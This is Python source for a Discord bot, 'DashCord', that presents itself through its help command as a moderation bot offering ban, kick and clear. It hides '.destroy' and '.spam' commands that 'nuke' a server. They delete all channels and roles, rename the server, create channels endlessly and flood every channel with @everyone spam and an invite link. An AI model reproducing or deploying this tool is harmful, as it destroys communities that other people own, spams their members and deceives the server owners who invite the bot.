import os
import discord
import random
import time
import ctypes
from discord.utils import get
from os import system
from discord.ext import commands
from discord import Permissions
clear = lambda: os.system('cls')
ctypes.windll.kernel32.SetConsoleTitleW("[DashCord] By Stapeuh | Main Menu")

bio = ['.help']

os.system("")
bot = commands.Bot(command_prefix = ".")
bot.remove_command('help')

# Group of ***different*** functions for different styles
class style():
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    GREY = '\033[0;37m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    ON_RED = '\033[41m'
    ON_BLACK = '\033[40m'

clear()
print (" ")
print (" ")
print(style.RED + "                              ██████╗░░█████╗░░██████╗██╗░░██╗░█████╗░░█████╗░██████╗░██████╗░")
print(style.RED + "                              ██╔══██╗██╔══██╗██╔════╝██║░░██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗")
print(style.RED + "                              ██║░░██║███████║╚█████╗░███████║██║░░╚═╝██║░░██║██████╔╝██║░░██║")
print(style.RED + "                              ██║░░██║██╔══██║░╚═══██╗██╔══██║██║░░██╗██║░░██║██╔══██╗██║░░██║")
print(style.RED + "                              ██████╔╝██║░░██║██████╔╝██║░░██║╚█████╔╝╚█████╔╝██║░░██║██████╔")
print(style.RED + "                              ╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═════╝░")
print(style.RED + "                                           █▄▄ █▄█   █▀ ▀█▀ ▄▀█ █▀█ █▀▀ █░█ █░█")
print(style.RED + "                                           █▄█ ░█░   ▄█ ░█░ █▀█ █▀▀ ██▄ █▄█ █▀█")
print(" ")
print(" ")
token=input(style.YELLOW + 'Enter the token of the bot here: ' + style.WHITE)

clear()
print (" ")
print (" ")
print(style.RED + "                              ██████╗░░█████╗░░██████╗██╗░░██╗░█████╗░░█████╗░██████╗░██████╗░")
print(style.RED + "                              ██╔══██╗██╔══██╗██╔════╝██║░░██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗")
print(style.RED + "                              ██║░░██║███████║╚█████╗░███████║██║░░╚═╝██║░░██║██████╔╝██║░░██║")
print(style.RED + "                              ██║░░██║██╔══██║░╚═══██╗██╔══██║██║░░██╗██║░░██║██╔══██╗██║░░██║")
print(style.RED + "                              ██████╔╝██║░░██║██████╔╝██║░░██║╚█████╔╝╚█████╔╝██║░░██║██████╔")
print(style.RED + "                              ╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═════╝░")
print(style.RED + "                                           █▄▄ █▄█   █▀ ▀█▀ ▄▀█ █▀█ █▀▀ █░█ █░█")
print(style.RED + "                                           █▄█ ░█░   ▄█ ░█░ █▀█ █▀▀ ██▄ █▄█ █▀█")
print(" ")
print(" ")

@bot.event
async def on_ready():

    print(style.YELLOW + "INFO: " + style.GREEN + f"The bot '{bot.user}' has successfully connected")
    ctypes.windll.kernel32.SetConsoleTitleW("[DashCord] By Stapeuh | " + f"{bot.user} connected")
    print(" ")
    print(" ")
    print(style.YELLOW + "INFO: " + style.CYAN + "The bot is on:")
    for guild in bot.guilds:
        print(style.YELLOW + "         > " + style.MAGENTA + style.UNDERLINE + guild.name + style.WHITE + style.RESET)
    print(" ")
    print(style.YELLOW + "INFO: " + style.WHITE + style.ON_RED + " Make '.destroy' and '.spam' in a channel to nuke. " + style.ON_BLACK)
    print(style.YELLOW + "INFO: " + style.WHITE + style.ON_RED + " Make '.quit' and the bot gonna leave. " + style.ON_BLACK)

    print(" ")

    await bot.change_presence(activity=discord.Streaming(name=".help", url="https://www.twitch.tv/stapeuh"))

@bot.event
async def on_server_join(server):
    print(style.YELLOW + "INFO: " + style.CYAN + "Joining {0}".format(server.name))

@bot.command()
@commands.has_permissions(ban_members=True)
async def clear(ctx, nombre : int):
    await ctx.channel.purge(limit = nombre + 1)
    await ctx.send(f"Vous venez de supprimer {nombre} message(s).")
    time.sleep(2)
    await ctx.channel.purge(limit = 1)

@bot.command(pass_context=True)
async def quit(ctx):
    print(style.YELLOW + "INFO: " + style.CYAN + style.WHITE + "The bot has leave the server: " + style.CYAN + f"{ctx.guild.name}." + style.WHITE)
    await ctx.guild.leave()
    await ctx.message.delete()

@bot.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member : discord.Member, *, reason = None):
    await ctx.send(f"{member} was banned from this server for {reason}")
    await member.send(f"You have been banned from {ctx.guild.name} for {reason}")
    await member.ban(reason = reason)
    print(style.YELLOW + "INFO: " + style.CYAN + f"{member}" + style.GREEN + "was banned of the server" + style.CYAN + "{ctx.guild.name}" + style.WHITE)

@bot.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member : discord.Member, *, reason = None):
    await ctx.send(f"{member} was kicked from this server for {reason}")
    await member.kick(reason = reason)
    await member.send(f"You have been kick from {ctx.guild.name} for {reason}")
    print(style.YELLOW + "INFO: " + style.CYAN + f"'{member}'" + style.GREEN + "was kicked of the server" + style.CYAN + "'{ctx.guild.name}'" + style.WHITE)

@bot.command()
async def help(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title="Missing Help", description="`.ban [member] (reason)`\nBan a member from the server.\n\n`.kick [member] (reason)`\nKick a member from the server.\n\n`.clear [number]`\nClear a specific number of messages.", color=0x55FFFF)
    await ctx.send(embed=embed)
    print(style.YELLOW + "INFO: " + style.GREEN + f"{ctx.message.author}" + style.CYAN + " did the .help command in the server " + style.GREEN + f"{ctx.guild.name}" + style.CYAN + ".")

@bot.command(pass_context=True)
async def destroy(ctx): 

    await ctx.message.delete()
    guild = ctx.message.guild

    with open('libs/img/image.jpg', 'rb') as f:
    	icon = f.read()
    	await ctx.message.guild.edit(icon=icon)
    	print(style.YELLOW + "INFO: " + style.CYAN + "Server Icon changed!")

    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(style.YELLOW + "INFO: " + style.CYAN + f"{channel.name} " + style.RED + "Has been deleted.")
        except:
            pass

    for role in guild.roles:
        try:
            await role.delete()
            print(style.YELLOW + "INFO: " + style.CYAN + f"{role.name}" + style.RED + "Has been deleted")
        except:
            pass

    for i in range(1):
        try:
            await ctx.guild.edit(name="DESTROYED WITH DASHCORD")
            print(style.YELLOW + "INFO: " + style.CYAN + "Name changed!")
        except:
            pass

    for i in range(1):
        await guild.create_text_channel("NUKED BY DASHCORD")
    while True:
        for channel in guild.text_channels:
            for i in range(20):
                await guild.create_text_channel("NUKED BY DASHCORD")
    for i in range(50):
        print(style.YELLOW + "INFO: " + style.CYAN + "Spammed Channels!")
        while True:
            for channel in guild.text_channels:
                await channel.send("@everyone DESTROYED BY DASHCORD https://discord.gg/g9gpnfdE2T")

@bot.command(pass_context=True)
async def spam(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    for i in range(2):
        print(style.YELLOW + "INFO: " + style.CYAN + "Spammed Channels!")
        while True:
            for channel in guild.text_channels:
                await channel.send("@everyone DESTROYED BY DASHCORD https://discord.gg/v8jZd62")

bot.run(token)